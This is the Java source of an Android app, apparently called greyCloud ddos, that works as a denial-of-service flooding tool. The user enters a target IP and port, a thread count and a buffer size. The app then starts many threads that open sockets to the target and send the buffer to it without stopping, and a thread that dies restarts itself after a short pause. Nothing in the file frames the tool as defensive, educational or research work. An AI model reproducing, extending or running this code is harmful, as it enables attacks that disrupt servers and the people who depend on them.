package com.greyCloud.ddos;


import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.DialogInterface;
import android.graphics.pdf.PdfDocument;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.support.annotation.Nullable;
import android.support.design.widget.TextInputEditText;
import android.support.v4.app.Fragment;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;

import java.io.DataOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.FutureTask;
import java.util.logging.Logger;

public class PageFragment extends Fragment {

    //信息部分
    public static byte[] buffer;//缓存区
    public static String ip;//目标服务器的ip
    public static int port;//             端口
    public static long killNum=0;//当前死亡的线程数量，每一秒清空一次
    public static int alive=0;//现在存活的线程
    public static volatile boolean isStart=false;//是否开始,后面线程也根据这个变量判断是否停止
    public static int threadNum=0;//线程总数
    public static int bufferSize=0;//缓存大小
    public static boolean flag=false;//错误记号
    public static String Thread_info="";//多线程投递过来的信息
    public static Object lock=new Object();//互斥锁
    public static Handler uiHandler = new Handler();//跨线程调用的handler
    public static Handler handler_thread=null;//统计线程的handler
    //组件部分
    AlertDialog Warningdialog;//警告的对话框，定义一个环保
    public static ProgressDialog progress;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
    }

    @Override
    public void onActivityCreated(Bundle a) {
        super.onActivityCreated(a);

        //初始化我们的警告对话框
        Warningdialog = new AlertDialog.Builder(getActivity()).setNegativeButton("确定", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();//就一个按钮，点完没事了
            }
        }).create();
        //还有进度框
        progress= new ProgressDialog(getActivity());
        progress.setTitle("正在处理");
        progress.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);//设置对话进度条样式为水平
        progress.getWindow().setGravity(Gravity.CENTER);//居中
        progress.setCancelable(false);// 设置是否可以通过点击Back键取消
        progress.setCanceledOnTouchOutside(false);// 设置在点击Dialog外是否取消Dialog进度条

        //最后是我们的统计线程专用的handler
        handler_thread=new Handler() {
            public void handleMessage(Message msg) {
                switch (msg.what) {
                    case 0:
                        ((TextView)getView().findViewById(R.id.threadInfo)).setText("死亡线程速度:"+killNum+"/s\n存活线程:"+alive+"\n");
                }
            }
        };

        //下面开始绑定按钮事件，同时也是本软件的核心部分
        Button btn_start = (Button) getView().findViewById(R.id.btn_start);
        Button btn_stop = (Button) getView().findViewById(R.id.btn_stop);
        btn_stop.setOnClickListener(new View.OnClickListener() {//停止事件
            @Override
            public void onClick(View v) {
                if(!isStart){
                    Warningdialog.setTitle("警告");
                    Warningdialog.setMessage("当前没有在执行攻击,请点击“开始攻击”按钮发起攻击");
                    Warningdialog.show();
                    return;
                }
                //发起暂停命令前我们设置一下progress
                progress.setMessage("正在回收线程");

                progress.setProgress(0);//归位
                while(PageFragment.progress.getProgress()!=0){
                    progress.setProgress(0);//归位
                }
                progress.show();
                synchronized (PageFragment.lock){
                    isStart=false;//归位,全体线程立马关闭！！！！！
                    if(alive==0){
                        ((LinearLayout) getView().findViewById(R.id.infoLayout)).setVisibility(View.GONE);//隐藏回去
                        progress.dismiss();

                        lock.notifyAll();
                        return;
                    }
                    progress.setMax(alive);

                    Log.println(Log.WARN,"progress","alive!"+PageFragment.alive+"progress!"+PageFragment.progress.getProgress());
                    ((LinearLayout) getView().findViewById(R.id.infoLayout)).setVisibility(View.GONE);//隐藏回去
                    lock.notifyAll();
                }




            }
        });
        btn_start.setOnClickListener(new View.OnClickListener() {//开始事件
            @Override
            public void onClick(View v) {
                if(isStart){
                    Warningdialog.setTitle("警告");
                    Warningdialog.setMessage("当前正在攻击,请先点击“停止攻击”按钮终止");
                    Warningdialog.show();
                    return;
                }
                //判断ip是否正确
                String[] arr_ip= ((EditText) getView().findViewById(R.id.info_ip)).getText().toString().split(":");
                Warningdialog.setTitle("警告");
                Warningdialog.setMessage("你的ip格式有误，请填写“ip:端口”这种形式，中间的冒号为半角符号（即英文符号），如“127.0.0.1:25565”");
                if(arr_ip.length!=2){
                    Warningdialog.show();
                    return;
                }

                try{
                    port=Integer.parseInt(arr_ip[1]);
                }catch(Exception e){
                    flag=true;
                }
                if(flag){
                    Warningdialog.show();
                    return;
                }
                ip=arr_ip[0];
                try{
                    threadNum=Integer.parseInt(((EditText) getView().findViewById(R.id.info_thread)).getText().toString());
                    bufferSize=Integer.parseInt(((EditText) getView().findViewById(R.id.info_buffer)).getText().toString());
                }catch(Exception e){
                    flag=true;
                }
                if(flag){
                    Warningdialog.setTitle("警告");
                    Warningdialog.setMessage("你的缓存大小或线程数量填写的并非数字，或是数字过大，暂不支持填除正整数以外的其他整数");
                    Warningdialog.show();
                    return;
                }

                //然后还没完，我们填充缓存，填充时有错误也是要报错的，我们开线程来进行

                final Handler handler=new Handler(){
                    public void handleMessage(Message msg){
                        switch(msg.what){
                            case 0:
                                //thread选择
                                progress.setMessage("正在释放线程");
                                progress.setMax(threadNum);
                                progress.setProgress(0);//归位
                                progress.show();
                                return;
                            case 1:
                                //buffer选择
                                progress.setProgress(0);//归位
                                progress.setMessage("正在创建缓存");//设置提示信息
                                progress.setMax(bufferSize);
                                progress.show();//调用show方法显示进度条对话框
                                return;
                            case 2:
                                //加一
                                progress.setProgress(progress.getProgress()+1);
                                return;
                            case 3:
                                //报错
                                Warningdialog.setTitle("警告");
                                Warningdialog.setMessage("释放线程或创建缓存时出错，错误信息："+Thread_info+"\n在保证操作正确的情况下依然报错，请联系作者，Email：753707290@qq.com（24小时内回复）");
                                Warningdialog.show();
                                return;
                            case 4:
                                //结束
                                ((LinearLayout) getView().findViewById(R.id.infoLayout)).setVisibility(View.VISIBLE);//把隐藏部分显示出来
                                progress.setProgress(0);
                                return;
                        }
                    }
                };

                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            Message message = new Message();
                            message.what = 1;
                            handler.sendMessage(message);
                            buffer = new byte[bufferSize * 1024];
                            for (int i = 0; i < bufferSize; i++) {
                                for (int a = 0; a < 1024; a++) {
                                    PageFragment.buffer[i * 1024 + a] = 123;
                                }
                                message = new Message();
                                message.what = 2;
                                handler.sendMessage(message);
                            }
                            isStart=true;
                            Thread.sleep(500);
                            //填完就轮到我们的线程了
                            message = new Message();
                            message.what = 0;
                            handler.sendMessage(message);
                            for (int i = 0; i < threadNum; i++) {
                                //Thread.sleep(1000);
                                Thread t=new thread_ddos();
                                t.start();
                                message = new Message();
                                message.what = 2;
                                handler.sendMessage(message);
                            }
                            //最后统计线程
                            Thread t=new thread_setNum();
                            t.start();
                            message = new Message();
                            message.what = 4;
                            handler.sendMessage(message);
                        }catch(Exception e){
                            Thread_info = e.getMessage();
                            e.printStackTrace();
                            Message message = new Message();
                            message.what = 3;
                            handler.sendMessage(message);
                        }finally{
                            progress.dismiss();
                        }
                    }
                }).start();

                //至此，这个按钮的使命结束
            }
        });
    }

    @Nullable
    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        //View view = inflater.inflate(R.layout.fragment_welcome, container, false);
        //TextView textView = (TextView) view;
        //textView.setText("Fragment #" + mPage);

        View view=inflater.inflate(R.layout.fragment_ddos2, container, false);;
        return view;
    }

}
class thread_ddos extends Thread{//ddos线程
    public Socket s=null;
    @Override
    public void run(){

        //初始化数据流
        OutputStream os=null;
        DataOutputStream dos=null;
        boolean isKill=false;//是否是错误导致的死亡
        while(PageFragment.isStart){//根据isStart判断是否要停止
            try {
                synchronized (PageFragment.lock){//同步
                    if(!PageFragment.isStart){//如果停止后线程又获得锁了，那么就直接返回
                        Log.println(Log.WARN,"return!!!!!","alive!"+PageFragment.alive);
                        continue;
                    }
                    PageFragment.alive++;
                    if(PageFragment.alive>PageFragment.threadNum){
                        Log.println(Log.WARN,"thread","alive!"+PageFragment.alive);
                    }
                    //Log.println(Log.WARN,"thread","alive!"+PageFragment.alive);
                    PageFragment.lock.notifyAll();
                }
                s=new Socket(PageFragment.ip,PageFragment.port);
                //流准备
                //s.setSoTimeout(
                os=s.getOutputStream();
                dos=new DataOutputStream(os);
                Log.println(Log.WARN,"thread","had create");

                while(PageFragment.isStart) {
                    //Log.println(Log.WARN,"thread","had worked");
                    dos.write(PageFragment.buffer);
                    dos.flush();
                }
            }catch(Exception e) {
                //PageFragment.kill.setText("正在攻击，当前已死亡线程:"+PageFragment.killN);
                ///uiHandler.post(runnable1);
                //System.out.println("线程死亡，重生！"+e.getMessage());
                //Runnable thread1 = new Thread1();
                isKill=true;
                e.printStackTrace();
            }finally {
                close(dos);
                close(os);
                close(s);

            }

            if (isKill) {
                //重生操作
                //如果停止命令已经发起，那么我们就不去重生
                if(!PageFragment.isStart){
                    Runnable runnable = new Runnable() {
                        @Override
                        public void run() {
                            //pd1.setMessage(String.valueOf(jd));
                            //给我们的progress刷新进度
                            //synchronized (PageFragment.lock) {//同步
                                PageFragment.progress.setProgress(PageFragment.progress.getProgress()+1);
                                Log.println(Log.WARN,"thread","alive!"+PageFragment.alive+"progress!"+PageFragment.progress.getProgress());
                                //最后一个线程擦屁股
                                if(PageFragment.progress.getProgress()>=PageFragment.alive){
                                    PageFragment.progress.dismiss();
                                    PageFragment.alive=0;
                                    //Log.println(Log.WARN,"thread","alive!"+PageFragment.alive+"progress!"+PageFragment.progress.getProgress());
                                    //PageFragment.lock.notifyAll();
                                }
                            //}
                        }
                    };
                    PageFragment.uiHandler.post(runnable);
                    return;
                }
                synchronized (PageFragment.lock) {//同步
                    PageFragment.killNum++;
                    PageFragment.alive--;
                    PageFragment.lock.notifyAll();
                }
                //重生！！！
                try {
                    Thread.sleep(300);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                Thread t=new thread_ddos();
                t.start();
                return;
            } else {
                Runnable runnable = new Runnable() {
                    @Override
                    public void run() {
                        //pd1.setMessage(String.valueOf(jd));
                        //给我们的progress刷新进度
                        //synchronized (PageFragment.lock) {//同步
                            PageFragment.progress.setProgress(PageFragment.progress.getProgress()+1);
                            //最后一个线程擦屁股
                            Log.println(Log.WARN,"thread","alive!"+PageFragment.alive+"progress!"+PageFragment.progress.getProgress());
                            if(PageFragment.progress.getProgress()>=PageFragment.alive){
                                PageFragment.progress.dismiss();
                                PageFragment.alive=0;
                                //PageFragment.lock.notifyAll();
                            }
                        //}
                    }
                };
                PageFragment.uiHandler.post(runnable);
            }
        }
    }
    public <T extends java.io.Closeable> void close(T t){
        try{
            if(t !=null){
                t.close();
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}

class thread_setNum extends Thread{

    @Override
    public void run(){
        while(PageFragment.isStart){//循环，每1秒更新一次数据，更新后将死亡线程数归零（又是同步）
            Message m=new Message();
            m.what=0;
            PageFragment.handler_thread.sendMessage(m);
            synchronized (PageFragment.lock){
                PageFragment.killNum=0;
                PageFragment.lock.notifyAll();
            }
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}